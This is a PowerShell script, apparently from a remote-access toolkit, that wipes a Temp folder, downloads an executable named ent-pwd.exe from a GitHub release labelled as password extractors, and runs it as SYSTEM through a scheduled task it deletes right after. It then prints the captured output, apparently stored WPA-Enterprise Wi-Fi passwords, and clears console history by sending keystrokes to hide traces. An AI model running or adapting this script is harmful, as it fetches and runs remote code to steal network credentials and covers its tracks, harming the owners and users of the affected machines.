$entcleanPrompt = "Proceed With the Wipe of Default\...\Temp Dir (y/n)"
$entclean = Read-Host $entcleanPrompt
if ([string]::IsNullOrEmpty($entclean)) {
    Start-Sleep -Seconds 2
    $entclean = "n"
}
if ($entclean.ToLower() -eq "y") {
    $wipeDirectory = "C:\Users\Default\AppData\Local\Temp"
    Write-Host "Wiping $wipeDirectory..."
    if (Test-Path -Path $wipeDirectory -PathType Container) {
        Remove-Item -Path "$wipeDirectory\*" -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
    } else {
        Write-Host "Directory not found: $wipeDirectory" -ForegroundColor Yellow
    }
} else {
}
$entrecovPrompt = "Proceed With WPA-ENT-PWD-Recovery (y/n)"
$entrecov = Read-Host $entrecovPrompt
if ([string]::IsNullOrEmpty($entrecov)) {
    Start-Sleep -Seconds 2
    $entrecov = "n"
}
if ($entrecov.ToLower() -eq "y") {
    Write-Host "Executing WPA-ENT-PWD-Recovery..."
    $entPwdUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/ent-pwd-extractors-1.1/ent-pwd.exe"
    $entPwdPath = "C:\Users\Default\AppData\Local\Temp\ent-pwd.exe"
    # Download psexec.exe
    Invoke-WebRequest -Uri $entPwdUrl -OutFile $entPwdPath
    # Create the scheduled task
    Import-Module ScheduledTasks
    $Command = $entPwdPath
    $Arguments = ""
    $name = "RunAs_LocalSystem_$(New-Guid)"
    $actionArguments = @{ '-Execute' = $Command }
    if (-not [string]::IsNullOrEmpty($Arguments)) { $actionArguments['-Argument'] = $Arguments }
    $action = New-ScheduledTaskAction @actionArguments
    $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType Interactive
    Register-ScheduledTask -TaskName $name -Action $action -Principal $principal
    # Set the working directory for the scheduled task
    $newWorkingDirectory = "C:\Users\Default\AppData\Local\Temp"
    $task = Get-ScheduledTask -TaskName $name
    $task.Actions[0].WorkingDirectory = $newWorkingDirectory
    Set-ScheduledTask -TaskName $name -TaskPath $task.TaskPath -Action $task.Actions
    # Start the scheduled task
    Get-ScheduledTask -TaskName $name | Start-ScheduledTask
    # Unregister the scheduled task
    Unregister-ScheduledTask $name -Confirm:$false
    # Execute the ent-pwd.exe and redirect the output to a file
    $outputFile = Join-Path (Split-Path $Command) "output.txt"
    Start-Process -FilePath $Command -RedirectStandardOutput $outputFile -NoNewWindow -Wait
    # Check if the output file exists
    if (Test-Path $outputFile) {
        Get-Content -Path $outputFile
    } else {
        Write-Host "Output file not found. The process may have encountered an error."
    }
} else {
}
#Cleanup
$sanit = Read-Host "Sanitization (y/n)"
if ([string]::IsNullOrEmpty($sanit)) {
    Start-Sleep -Seconds 1
    $sanit = "y"
}
if ($sanit.ToLower() -eq "y") {
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}')
clear
} else {
}